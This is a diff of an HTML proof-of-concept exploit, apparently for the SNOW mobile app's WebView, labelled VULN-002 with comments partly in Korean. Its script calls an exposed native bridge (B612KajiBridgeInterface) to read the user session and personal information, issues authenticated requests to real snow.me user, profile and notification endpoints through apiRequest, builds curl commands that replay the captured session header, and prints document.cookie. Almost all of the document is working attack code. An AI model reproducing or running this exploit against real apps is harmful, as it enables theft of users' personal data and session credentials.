@@ -5,87 +5,140 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{background:#111;color:#eee;font-family:monospace;font-size:12px;padding:12px;word-break:break-all}
+body{background:#0d1117;color:#e6edf3;font-family:monospace;font-size:12px;padding:12px;word-break:break-all}
 .t{color:#f85149;font-weight:bold;font-size:14px;display:block;margin-bottom:10px}
-.s{background:#161b22;border:1px solid #30363d;border-radius:5px;padding:8px 10px;margin-bottom:8px}
-.k{color:#e3b341;min-width:110px;display:inline-block;vertical-align:top}
+.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px;margin-bottom:8px}
+.k{color:#e3b341;display:block;font-size:11px;margin-bottom:3px}
 .v{color:#79c0ff}
 .hi{color:#f85149;font-weight:bold}
 .ok{color:#3fb950;font-weight:bold}
+.curl{color:#a5d6ff;font-size:10px;margin-top:6px;display:block;background:#0d1117;padding:6px;border-radius:4px}
 </style>
 </head>
 <body>
-<span class="t">⚠ VULN-002 PoC — Bridge Method Enumeration</span>
+<span class="t">⚠ VULN-002 PoC — apiRequest() 개인정보 노출</span>
 <div id="o"></div>
 <script>
 var o = document.getElementById('o');
-function row(k, v, cls) {
-  o.innerHTML += '<div class="s"><span class="k">' + k + '</span><span class="' + (cls||'v') + '">' + String(v) + '</span></div>';
+var sessionData = {};
+
+function show(title, data, isSensitive) {
+  var v = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data);
+  o.innerHTML += '<div class="card"><span class="k">' + title + '</span>'
+    + '<span class="' + (isSensitive ? 'hi' : 'v') + '">' + v + '</span></div>';
+}
+
+function showCurl(method, url, headers, body) {
+  var h = Object.entries(headers||{})
+    .map(function(e){ return "-H '"+e[0]+": "+e[1]+"'"; }).join(' ');
+  var b = body ? "-d '"+JSON.stringify(body)+"'" : '';
+  var cmd = 'curl -sk -X ' + method + ' \\\n  "' + url + '" \\\n  ' + h + (b?' \\\n  '+b:'');
+  o.innerHTML += '<div class="card"><span class="k">📋 curl 재현 명령</span>'
+    + '<span class="curl">' + cmd + '</span></div>';
 }
 
 // Bridge 탐색
-var b = null, bname = '';
-['B612KajiBridgeInterface','AndroidBridge','androidBridge','snowBridge'].forEach(function(n){
-  try { if (!b && typeof window[n] !== 'undefined') { b = window[n]; bname = n; } } catch(e){}
+var b = null;
+['B612KajiBridgeInterface','AndroidBridge'].forEach(function(n){
+  try{ if(!b && typeof window[n]!=='undefined') b=window[n]; }catch(e){}
 });
 
 if (!b) {
-  row('RESULT', 'Bridge NOT FOUND', 'hi');
+  show('BRIDGE', 'NOT FOUND', true);
 } else {
-  row('Bridge', bname + ' FOUND', 'ok');
+  show('BRIDGE', 'B612KajiBridgeInterface FOUND ✓', false);
 
-  // 전체 메서드 열거
-  var methods = [];
+  /* ── 1. getUserSession (콜백 방식) ── */
   try {
-    for (var k in b) {
+    b.getUserSession(function(raw) {
+      try { sessionData = JSON.parse(raw); } catch(e) { sessionData = {raw: raw}; }
+      show('getUserSession()', sessionData, true);
+
+      /* ── 2. getPersonalInfo (콜백) ── */
       try {
-        if (typeof b[k] === 'function') methods.push(k);
-      } catch(e) {}
-    }
-  } catch(e) {}
+        b.getPersonalInfo(function(pii) {
+          show('getPersonalInfo()', pii || '(empty)', true);
+        });
+      } catch(e) { show('getPersonalInfo ERR', e, false); }
 
-  row('메서드 수', methods.length, 'ok');
-  row('메서드 목록', methods.join(' | ') || '(empty)', 'v');
-
-  // 세션/유저 관련 메서드 탐색
-  var sessionMethods = methods.filter(function(m){
-    var ml = m.toLowerCase();
-    return ml.indexOf('session') >= 0 || ml.indexOf('user') >= 0 ||
-           ml.indexOf('personal') >= 0 || ml.indexOf('info') >= 0 ||
-           ml.indexOf('login') >= 0 || ml.indexOf('profile') >= 0 ||
-           ml.indexOf('account') >= 0 || ml.indexOf('token') >= 0 ||
-           ml.indexOf('auth') >= 0;
-  });
-
-  if (sessionMethods.length) {
-    row('관련 메서드', sessionMethods.join(' | '), 'hi');
-
-    // 관련 메서드 각각 호출 시도 (인자 없이)
-    sessionMethods.forEach(function(m) {
+      /* ── 3. apiRequest → user/me ── */
+      window.__cb_me = function(resp) {
+        show('apiRequest → /v1/user/me', resp, true);
+        showCurl('GET',
+          'https://user-snow-api.snow.me/v1/user/me',
+          {'x-color': sessionData.xColor || '', 'User-Agent': 'okhttp/5.1.0'},
+          null);
+      };
       try {
-        var r = b[m]();
-        row(m + '()', r === undefined ? '(undefined)' : String(r), 'hi');
-      } catch(e) {
-        row(m + '()', String(e), 'v');
-      }
+        b.apiRequest('__cb_me', JSON.stringify({
+          url: 'https://user-snow-api.snow.me/v1/user/me',
+          method: 'get', headers: {}, parameters: {}
+        }));
+      } catch(e) { show('apiRequest /user/me ERR', e, false); }
+
+      /* ── 4. apiRequest → user profile ── */
+      window.__cb_profile = function(resp) {
+        show('apiRequest → /v1/user/profile', resp, true);
+      };
+      try {
+        b.apiRequest('__cb_profile', JSON.stringify({
+          url: 'https://user-snow-api.snow.me/v1/user/profile',
+          method: 'get', headers: {}, parameters: {}
+        }));
+      } catch(e) { show('apiRequest /profile ERR', e, false); }
+
+      /* ── 5. apiRequest → ugc my info ── */
+      window.__cb_ugc = function(resp) {
+        show('apiRequest → ugc /v1/my/info', resp, true);
+        showCurl('GET',
+          'https://ugc-snow-api.snow.me/v1/my/info',
+          {'x-color': sessionData.xColor || '', 'User-Agent': 'okhttp/5.1.0'},
+          null);
+      };
+      try {
+        b.apiRequest('__cb_ugc', JSON.stringify({
+          url: 'https://ugc-snow-api.snow.me/v1/my/info',
+          method: 'get', headers: {}, parameters: {}
+        }));
+      } catch(e) { show('apiRequest ugc ERR', e, false); }
+
+      /* ── 6. apiRequest → notification settings ── */
+      window.__cb_notif = function(resp) {
+        show('apiRequest → notification/settings', resp, true);
+      };
+      try {
+        b.apiRequest('__cb_notif', JSON.stringify({
+          url: 'https://snow-notification-api.snow.me/v1/notification/settings',
+          method: 'get', headers: {}, parameters: {}
+        }));
+      } catch(e) { show('apiRequest notif ERR', e, false); }
+
+      /* ── 7. apiRequest → 성공한 엔드포인트 헤더 캡처 ── */
+      // apiRequest가 실제로 어떤 헤더를 보내는지 확인
+      window.__cb_hdr = function(resp) {
+        show('apiRequest → headers capture', resp, false);
+      };
+      try {
+        b.apiRequest('__cb_hdr', JSON.stringify({
+          url: 'https://user-snow-api.snow.me/v1/user/sns/code/apple',
+          method: 'post',
+          headers: {},
+          parameters: {identityToken:'test',authorizationCode:'test',userId:'t@t.com'}
+        }));
+      } catch(e) { show('apiRequest headers ERR', e, false); }
+
     });
+  } catch(e) {
+    show('getUserSession(callback) ERR', String(e), true);
+
+    /* 동기 호출 폴백 */
+    try {
+      var raw = b.getUserSession();
+      show('getUserSession() sync', raw, true);
+    } catch(e2) { show('getUserSession sync ERR', String(e2), false); }
   }
 
-  // 인자 없이 호출 가능한 모든 메서드 시도
-  row('--- 전체 호출 시도 ---', '', 'ok');
-  methods.forEach(function(m) {
-    try {
-      var r = b[m]();
-      if (r !== undefined && r !== null && String(r).length > 0 && String(r) !== 'undefined') {
-        row(m + '()', String(r).substring(0, 200), 'hi');
-      }
-    } catch(e) {
-      // 오류는 무시 (인자 필요한 메서드)
-    }
-  });
-
-  // Cookie
-  row('cookie', document.cookie || '(empty)', document.cookie ? 'hi' : 'v');
+  show('document.cookie', document.cookie || '(empty)', !!document.cookie);
 }
 </script>
 </body>
